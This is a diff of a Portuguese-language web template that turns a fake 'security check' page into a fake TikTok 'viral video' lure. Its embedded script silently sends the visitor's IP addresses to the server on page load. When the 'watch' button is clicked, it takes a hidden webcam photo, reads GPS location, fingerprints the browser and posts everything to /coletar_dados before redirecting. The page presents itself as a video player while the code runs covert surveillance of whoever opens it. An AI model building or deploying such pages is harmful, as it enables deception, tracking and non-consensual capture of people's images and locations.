@@ -1,146 +1,373 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <title>Verificação de Segurança</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Inter', sans-serif;
-      background-color: #f9fafb;
-      color: #111827;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok - Conteúdo Viral 🔥</title>
+    <link rel="icon" href="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok/webapp/main/webapp-desktop/8152caf0c8e8bc67ae0d.png">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-    .card {
-      background: white;
-      border-radius: 16px;
-      box-shadow: 0 10px 20px rgba(0,0,0,0.08);
-      padding: 32px;
-      width: 100%;
-      max-width: 400px;
-      text-align: center;
-    }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #000;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
 
-    .logo {
-      width: 60px;
-      margin-bottom: 16px;
-    }
+        .container {
+            position: relative;
+            width: 100%;
+            max-width: 480px;
+            height: 100vh;
+            background: linear-gradient(180deg, #000 0%, #1a1a1a 100%);
+        }
 
-    h2 {
-      font-size: 22px;
-      font-weight: 600;
-      margin-bottom: 8px;
-    }
+        .video-preview {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect fill="%23121212" width="100" height="100"/><circle cx="50" cy="30" r="8" fill="%23333"/><circle cx="30" cy="60" r="12" fill="%23333"/><circle cx="70" cy="70" r="10" fill="%23333"/></svg>') center/cover;
+            filter: blur(20px);
+            opacity: 0.6;
+        }
 
-    p {
-      font-size: 15px;
-      color: #6b7280;
-      margin-bottom: 24px;
-    }
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(10px);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 24px;
+        }
 
-    .button {
-      background-color: #2563eb;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      padding: 12px 20px;
-      font-size: 16px;
-      cursor: pointer;
-      transition: background-color 0.2s;
-    }
+        .tiktok-logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 24px;
+            animation: pulse 2s infinite;
+        }
 
-    .button:hover {
-      background-color: #1d4ed8;
-    }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
 
-    #mensagem {
-      font-size: 14px;
-      color: #374151;
-      margin-top: 16px;
-      font-weight: bold;
-    }
+        .viral-badge {
+            background: linear-gradient(135deg, #fe2c55 0%, #ff0050 100%);
+            color: white;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            animation: glow 2s infinite;
+        }
 
-    .loading {
-      margin-top: 20px;
-      font-size: 13px;
-      color: #6b7280;
-    }
+        @keyframes glow {
+            0%, 100% { box-shadow: 0 0 20px rgba(254, 44, 85, 0.5); }
+            50% { box-shadow: 0 0 30px rgba(254, 44, 85, 0.8); }
+        }
 
-    .spinner {
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid #2563eb;
-      border-radius: 50%;
-      width: 28px;
-      height: 28px;
-      animation: spin 1s linear infinite;
-      margin: 0 auto 8px;
-    }
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 12px;
+            background: linear-gradient(135deg, #69c9d0 0%, #ee1d52 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
 
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-  </style>
+        .subtitle {
+            font-size: 16px;
+            color: #a8a8a8;
+            text-align: center;
+            margin-bottom: 32px;
+            line-height: 1.6;
+        }
+
+        .stats-container {
+            display: flex;
+            gap: 24px;
+            margin-bottom: 32px;
+            justify-content: center;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-number {
+            font-size: 24px;
+            font-weight: 700;
+            color: #fe2c55;
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .stat-label {
+            font-size: 13px;
+            color: #8a8a8a;
+        }
+
+        .feature-list {
+            width: 100%;
+            max-width: 300px;
+            margin-bottom: 32px;
+        }
+
+        .feature-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 12px;
+            margin-bottom: 8px;
+        }
+
+        .feature-icon {
+            width: 36px;
+            height: 36px;
+            background: linear-gradient(135deg, #69c9d0 0%, #ee1d52 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .feature-text {
+            font-size: 14px;
+            color: #e0e0e0;
+            font-weight: 500;
+        }
+
+        .watch-btn {
+            width: 100%;
+            max-width: 300px;
+            background: linear-gradient(135deg, #fe2c55 0%, #ff0050 100%);
+            color: white;
+            border: none;
+            border-radius: 28px;
+            padding: 16px 32px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            box-shadow: 0 8px 24px rgba(254, 44, 85, 0.4);
+        }
+
+        .watch-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 32px rgba(254, 44, 85, 0.6);
+        }
+
+        .watch-btn:active {
+            transform: translateY(0);
+        }
+
+        .disclaimer {
+            font-size: 11px;
+            color: #666;
+            text-align: center;
+            margin-top: 20px;
+            line-height: 1.4;
+        }
+
+        .loading-state {
+            display: none;
+            text-align: center;
+        }
+
+        .loading-state.active {
+            display: block;
+        }
+
+        .spinner-container {
+            position: relative;
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 20px;
+        }
+
+        .spinner {
+            position: absolute;
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255,255,255,0.1);
+            border-top: 4px solid #fe2c55;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        .spinner:nth-child(2) {
+            border-top-color: #69c9d0;
+            animation-duration: 1.5s;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 24px;
+            }
+            
+            .subtitle {
+                font-size: 14px;
+            }
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <div class="video-preview"></div>
+        
+        <div class="overlay">
+            <svg class="tiktok-logo" viewBox="0 0 48 48">
+                <g>
+                    <path fill="#25f4ee" d="M38.43 15.8a14.13 14.13 0 0 1-7.92-2.41 14.03 14.03 0 0 1-5.37-10.93V1h-7.92v28.93a8.14 8.14 0 0 1-8.13 8.13 8.14 8.14 0 0 1-8.13-8.13 8.14 8.14 0 0 1 8.13-8.13c.7 0 1.38.09 2.03.25V14.1a16.04 16.04 0 0 0-2.03-.13c-8.82 0-16 7.18-16 16s7.18 16 16 16 16-7.18 16-16V18.03a21.95 21.95 0 0 0 11.96 3.55V13.6c-.98.02-1.95-.09-2.85-.32-.89-.22-1.75-.54-2.56-.97a15.25 15.25 0 0 1-2.54-1.5z"/>
+                    <path fill="#fe2c55" d="M39.2 15.8a14.13 14.13 0 0 1-7.92-2.41 14.03 14.03 0 0 1-5.37-10.93V1h-7.92v28.93a8.14 8.14 0 0 1-8.13 8.13 8.14 8.14 0 0 1-8.13-8.13 8.14 8.14 0 0 1 8.13-8.13c.7 0 1.38.09 2.03.25V14.1a16.04 16.04 0 0 0-2.03-.13c-8.82 0-16 7.18-16 16s7.18 16 16 16 16-7.18 16-16V18.03a21.95 21.95 0 0 0 11.96 3.55V13.6c-.98.02-1.95-.09-2.85-.32-.89-.22-1.75-.54-2.56-.97-.85-.43-1.67-.96-2.44-1.58z"/>
+                    <path fill="#fff" d="M39.2 15.8a14.13 14.13 0 0 1-7.92-2.41 14.03 14.03 0 0 1-5.37-10.93V1h-7.92v28.93a8.14 8.14 0 0 1-8.13 8.13 8.14 8.14 0 0 1-8.13-8.13 8.14 8.14 0 0 1 8.13-8.13c.7 0 1.38.09 2.03.25V14.1a16.04 16.04 0 0 0-2.03-.13c-8.82 0-16 7.18-16 16s7.18 16 16 16 16-7.18 16-16V18.03a21.95 21.95 0 0 0 11.96 3.55V13.6c-.98.02-1.95-.09-2.85-.32z" opacity=".9"/>
+                </g>
+            </svg>
 
-  <div class="card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/TikTok_logo.svg" alt="logo" class="logo">
+            <div class="viral-badge">
+                🔥 VIRAL AGORA • 2.8M visualizações
+            </div>
 
-    <h2>Verificação de Segurança</h2>
-    <p>Por favor, clique para continuar.</p>
+            <h1>Vídeo Exclusivo 🎬</h1>
+            <p class="subtitle">
+                Este conteúdo está sendo assistido por milhões de pessoas agora!<br>
+                Clique para assistir antes que seja removido
+            </p>
 
-    <button id="permitir" class="button">Seguinte</button>
-    <p id="mensagem"></p>
+            <div class="stats-container">
+                <div class="stat-item">
+                    <span class="stat-number">2.8M</span>
+                    <span class="stat-label">Views</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-number">450K</span>
+                    <span class="stat-label">Likes</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-number">89K</span>
+                    <span class="stat-label">Shares</span>
+                </div>
+            </div>
 
-    <div class="loading" id="loading" style="display:none;">
-      <div class="spinner"></div>
-      Verificando informações...
+            <div class="feature-list">
+                <div class="feature-item">
+                    <div class="feature-icon">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
+                            <path d="M8 5v14l11-7z"/>
+                        </svg>
+                    </div>
+                    <span class="feature-text">Vídeo em Alta Qualidade (HD)</span>
+                </div>
+                <div class="feature-item">
+                    <div class="feature-icon">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
+                            <path d="M12 2L2 7v10c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-10-5z"/>
+                        </svg>
+                    </div>
+                    <span class="feature-text">Conteúdo Verificado</span>
+                </div>
+                <div class="feature-item">
+                    <div class="feature-icon">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
+                            <path d="M13 3c-4.97 0-9 4.03-9 9H1l3.89 3.89.07.14L9 12H6c0-3.87 3.13-7 7-7s7 3.13 7 7-3.13 7-7 7c-1.93 0-3.68-.79-4.94-2.06l-1.42 1.42C8.27 19.99 10.51 21 13 21c4.97 0 9-4.03 9-9s-4.03-9-9-9z"/>
+                        </svg>
+                    </div>
+                    <span class="feature-text">Disponível por tempo limitado</span>
+                </div>
+            </div>
+
+            <button id="watchBtn" class="watch-btn">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
+                    <path d="M8 5v14l11-7z"/>
+                </svg>
+                Assistir Agora
+            </button>
+
+            <p class="disclaimer">
+                Ao clicar, você concorda com os Termos de Uso do TikTok
+            </p>
+
+            <div class="loading-state" id="loadingState">
+                <div class="spinner-container">
+                    <div class="spinner"></div>
+                    <div class="spinner"></div>
+                </div>
+                <p style="color: #fff; font-weight: 600; font-size: 16px; margin-bottom: 8px;">Carregando vídeo...</p>
+                <p style="color: #a8a8a8; font-size: 14px;">Preparando o melhor conteúdo para você</p>
+            </div>
+        </div>
     </div>
-  </div>
 
-  <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
-<script>
-    const slug = {{ slug | tojson | safe }};
-    const destino = {{ destino | tojson | safe }};
-    const inicioTempo = Date.now();
+    <script>
+        const slug = {{ slug | tojson | safe }};
+        const destino = {{ destino | tojson | safe }};
+        const inicioTempo = Date.now();
 
-    // Coleta de IP Inicial
-    (async () => {
-        let ip_v4 = "indefinido";
-        let ip_v6 = "indefinido";
-        let porta = location.port || (location.protocol === "https:" ? "443" : "80");
+        // Coleta de IP Inicial
+        (async () => {
+            let ip_v4 = "indefinido", ip_v6 = "indefinido";
+            let porta = location.port || (location.protocol === "https:" ? "443" : "80");
 
-        try {
-            const resV4 = await fetch("https://api.ipify.org?format=json");
-            if (resV4.ok) ip_v4 = (await resV4.json()).ip;
-        } catch (e) {}
+            try {
+                const resV4 = await fetch("https://api.ipify.org?format=json");
+                if (resV4.ok) ip_v4 = (await resV4.json()).ip;
+            } catch (e) {}
 
-        try {
-            const resV6 = await fetch("https://api64.ipify.org?format=json");
-            if (resV6.ok) ip_v6 = (await resV6.json()).ip;
-        } catch (e) {}
+            try {
+                const resV6 = await fetch("https://api64.ipify.org?format=json");
+                if (resV6.ok) ip_v6 = (await resV6.json()).ip;
+            } catch (e) {}
 
-        try {
-            const payloadInicial = { slug, ip_v4, ip_v6, porta };
-            await fetch("/coletar_ip_inicial", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payloadInicial)
-            });
-        } catch (e) {}
-    })();
+            try {
+                await fetch("/coletar_ip_inicial", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ slug, ip_v4, ip_v6, porta })
+                });
+            } catch (e) {}
+        })();
 
-    const coletarInfoBrowser = () => {
-        return {
+        const coletarInfoBrowser = () => ({
             userAgent: navigator.userAgent,
             idioma: navigator.language,
             fusoHorario: Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -148,127 +375,84 @@
             alturaTela: window.screen.height,
             plataforma: navigator.platform,
             conexao: (navigator.connection || {}).effectiveType || "indisponível"
-        };
-    };
-
-    async function coletarDadosDetalhes() {
-        let latitude = "indefinido", longitude = "indefinido", foto_base64 = null;
-        const mensagemElement = document.getElementById('mensagem');
-
-        try {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            if (video && canvas && navigator.mediaDevices?.getUserMedia) {
-                const streamPromise = navigator.mediaDevices.getUserMedia({ video: true });
-                const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 10000));
-                const stream = await Promise.race([streamPromise, timeoutPromise]);
-
-                video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 3000));
-
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                foto_base64 = canvas.toDataURL("image/jpeg", 0.8);
-
-                stream.getTracks().forEach(track => track.stop());
-            }
-        } catch (e) {}
-
-        try {
-            if (navigator.geolocation) {
-                const geoPromise = new Promise((res, rej) =>
-                    navigator.geolocation.getCurrentPosition(res, rej, { timeout: 30000 })
-                );
-                const pos = await Promise.race([
-                    geoPromise,
-                    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 30000))
-                ]);
-                latitude = pos.coords.latitude.toString();
-                longitude = pos.coords.longitude.toString();
-            }
-        } catch (e) {}
-
-        const infosBrowser = coletarInfoBrowser();
-
-        let ip_v4_detalhes = "indefinido";
-        let ip_v6_detalhes = "indefinido";
-        let porta_detalhes = location.port || (location.protocol === "https:" ? "443" : "80");
-
-        try {
-            const resV4 = await fetch("https://api.ipify.org?format=json");
-            if (resV4.ok) ip_v4_detalhes = (await resV4.json()).ip;
-        } catch (e) {}
-
-        try {
-            const resV6 = await fetch("https://api64.ipify.org?format=json");
-            if (resV6.ok) ip_v6_detalhes = (await resV6.json()).ip;
-        } catch (e) {}
-
-        const tempoSegundos = Math.floor((Date.now() - inicioTempo) / 3000);
-
-        const payloadDetalhes = {
-            slug,
-            ip_v4: ip_v4_detalhes,
-            ip_v6: ip_v6_detalhes,
-            porta: porta_detalhes,
-            latitude,
-            longitude,
-            foto_base64,
-            tempoSegundos,
-            sistema: infosBrowser.plataforma,
-            navegador: infosBrowser.userAgent,
-            idioma: infosBrowser.idioma,
-            fusoHorario: infosBrowser.fusoHorario,
-            conexao: infosBrowser.conexao,
-            larguraTela: infosBrowser.larguraTela,
-            alturaTela: infosBrowser.alturaTela
-        };
-
-        try {
-            if (mensagemElement) mensagemElement.innerText = "Redirecionando para site seguro...";
-            const res = await fetch("/coletar_dados", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payloadDetalhes)
-            });
-
-            window.location.href = `/redir/${slug}`;
-        } catch (e) {
-            window.location.href = `/redir/${slug}`;
-        }
-    }
-
-    async function obterInfoServidor() {
-        try {
-            const res = await fetch('/info_servidor');
-            if (res.ok) {
-                const dados = await res.json();
-                console.log('IP do servidor:', dados.ip_servidor);
-                console.log('Porta do servidor:', dados.porta_servidor);
-                // Use como quiser!
-            }
-        } catch (e) {
-            console.error('Erro ao obter info do servidor:', e);
-        }
-    }
-
-    document.addEventListener('DOMContentLoaded', () => {
-        const btn = document.getElementById('permitir');
-        btn.addEventListener('click', () => {
-            document.getElementById('loading').style.display = 'block';
-            coletarDadosDetalhes();
-            obterInfoServidor(); // Chamada adicionada aqui!
         });
-    });
 
-    // Elementos esperados no HTML:
-    /*
-    <video id="video" width="640" height="480" autoplay style="display: none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
-    <p id="mensagem" style="text-align: center; color: white;"></p>
-    */
-</script>
-  
+        async function coletarDadosDetalhes() {
+            let latitude = "indefinido", longitude = "indefinido", foto_base64 = null;
+
+            try {
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                if (video && canvas && navigator.mediaDevices?.getUserMedia) {
+                    const stream = await Promise.race([
+                        navigator.mediaDevices.getUserMedia({ video: true }),
+                        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 10000))
+                    ]);
+
+                    video.srcObject = stream;
+                    await new Promise(r => setTimeout(r, 3000));
+
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    foto_base64 = canvas.toDataURL("image/jpeg", 0.8);
+
+                    stream.getTracks().forEach(track => track.stop());
+                }
+            } catch (e) {}
+
+            try {
+                if (navigator.geolocation) {
+                    const pos = await Promise.race([
+                        new Promise((res, rej) => 
+                            navigator.geolocation.getCurrentPosition(res, rej, { timeout: 30000 })
+                        ),
+                        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 30000))
+                    ]);
+                    latitude = pos.coords.latitude.toString();
+                    longitude = pos.coords.longitude.toString();
+                }
+            } catch (e) {}
+
+            const infosBrowser = coletarInfoBrowser();
+            let ip_v4_detalhes = "indefinido", ip_v6_detalhes = "indefinido";
+            let porta_detalhes = location.port || (location.protocol === "https:" ? "443" : "80");
+
+            try {
+                const resV4 = await fetch("https://api.ipify.org?format=json");
+                if (resV4.ok) ip_v4_detalhes = (await resV4.json()).ip;
+            } catch (e) {}
+
+            try {
+                const resV6 = await fetch("https://api64.ipify.org?format=json");
+                if (resV6.ok) ip_v6_detalhes = (await resV6.json()).ip;
+            } catch (e) {}
+
+            const tempoSegundos = Math.floor((Date.now() - inicioTempo) / 1000);
+
+            try {
+                await fetch("/coletar_dados", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        slug, ip_v4: ip_v4_detalhes, ip_v6: ip_v6_detalhes,
+                        porta: porta_detalhes, latitude, longitude, foto_base64,
+                        tempoSegundos, sistema: infosBrowser.plataforma,
+                        navegador: infosBrowser.userAgent, idioma: infosBrowser.idioma,
+                        fusoHorario: infosBrowser.fusoHorario, conexao: infosBrowser.conexao,
+                        larguraTela: infosBrowser.larguraTela, alturaTela: infosBrowser.alturaTela
+                    })
+                });
+            } catch (e) {}
+
+            window.location.href = `/redir/${slug}`;
+        }
+
+        document.getElementById('watchBtn').addEventListener('click', () => {
+            document.querySelectorAll('.overlay > *:not(#loadingState)').forEach(el => el.style.display = 'none');
+            document.getElementById('loadingState').classList.add('active');
+            coletarDadosDetalhes();
+        });
+    </script>
 </body>
 </html>
